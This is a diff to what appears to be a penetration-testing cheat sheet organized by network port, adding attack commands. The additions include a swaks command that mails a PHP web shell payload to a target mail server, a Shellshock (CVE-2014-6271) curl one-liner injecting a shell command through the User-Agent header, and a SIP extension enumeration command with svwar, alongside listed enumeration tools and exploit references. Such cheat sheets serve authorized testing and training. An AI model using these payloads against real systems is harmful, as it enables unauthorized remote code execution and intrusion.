@@ -5,6 +5,14 @@
 
 
 
+## 25
+### swaks
+```sh
+swaks -f 'FREENAME@DOMAINNAME' -t 'TO_USERNAME@DOMAINNAME' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
+```
+
+
+
 ## 80
 ### cadaver
 ```sh
@@ -14,6 +22,7 @@ cadaver http://IP
 ```sh
 curl -I http://'IP'
 curl -X OPTIONS -I http://'IP'
+curl -ks
 ```
 ### davtest
 ```sh
@@ -30,6 +39,12 @@ nmap -n -Pn -p80 --script=http-methods 'IP'
 ```
 ### PoC
 #### rce
+- shellshock
+  ```sh
+  # CVE-2014-6271
+  curl -A "() { :;}; COMMAND" http://'IP'
+  ```
+  https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
 - CVE-2012-4869 - FreePBX = 2.9/2.10
 - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
 
@@ -186,9 +201,9 @@ smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r '
 
 
 
-## 5060(UDP)
+## 5060 (UDP)
 ```sh
-svwar -m INVITE 'IP'
+svwar -t 'Duration' -e 'EXTENSION RANGE' -m INVITE 'IP'
 ```
 
 
